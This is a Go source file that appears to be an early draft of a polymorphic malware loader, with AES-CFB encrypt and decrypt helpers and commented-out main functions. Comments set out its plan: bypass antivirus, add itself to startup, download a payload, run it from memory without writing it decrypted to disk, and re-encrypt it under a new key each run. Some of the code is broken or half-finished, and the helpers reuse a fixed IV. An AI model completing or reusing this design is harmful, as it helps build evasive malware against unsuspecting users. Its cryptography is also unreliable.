package main

import (
	"crypto/aes"
	"crypto/cipher"
	_ "crypto/rand"
	_ "io"
	_ "os"
	_ "os/exec"
	_ "fmt"
	_ "io/ioutil"

)



var iv = []byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f}
var plaintext []byte
var key_text string
/*
func main() {
    key_text := "astaxie12798akljzmknm.ahkjkljl;k" //generate random 32 char string
    fmt.Println("ok", key_text);
    exec.Command("msg * ffdf").Run()
    /*
    // read the whole file at once
    i, _ := ioutil.ReadFile("/home/debian/Tiked/client/Polymorphic/test")
    i = Encrypt(i, key_text)
    i = Decrytp(i, key_text)
    // write the whole body at once
    ioutil.WriteFile("/home/debian/Tiked/client/Polymorphic/output", i, 0777)


	c := exec.Command("/home/debian/Tiked/client/Polymorphic/output")
	out, _ := c.Output()
	c.Run()
	fmt.Println(string(out))


*/
    //Bypass AV
    //Add to startup
    //Download main.exe if not in dir
        //Run main from memory
        //Save encrypted
        //run RestarterHelper
        //Exit

    //Decrypt
    //Run from memory
    //Encrypt with diiferent pass
    //Save pass
    //run Resparter helper
    //Exit


    // Need to encrypt a string
    // aes encryption string

//}


func AesEncrypt(plaintext []byte, key_text string) []byte{
    c, _ := aes.NewCipher([]byte(key_text))
    ciphertext := make([]byte, len(plaintext))
    cfb := cipher.NewCFBEncrypter(c, iv)
    cfb.XORKeyStream(ciphertext, plaintext)
    return ciphertext
}

func AesDecrytp(ciphertext []byte, key_text string) []byte {
    c, _ := aes.NewCipher([]byte(key_text))
    cfbdec := cipher.NewCFBDecrypter(c, iv)
    plaintextCopy := make([]byte, len(ciphertext))
    cfbdec.XORKeyStream(plaintextCopy, ciphertext)
    return plaintextCopy
    
}









/*
func main() {
	res := Encrypt([]byte("pass"), []byte("eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"))
	fmt.Println(res)


	//Download file if not present 
		//Save file encrypted
	
	//Decrytp core program 
	//run decoded form memory, don't save decrypted to disk
	//Encrypt and save core with other random key, And save key!
	//Exit
}

func Encrypt(key []byte, data []byte) string {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	cipherText := make([]byte, aes.BlockSize+len(data))
	iv := cipherText[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cipherText[aes.BlockSize:], data)

	return string(cipherText)
}*/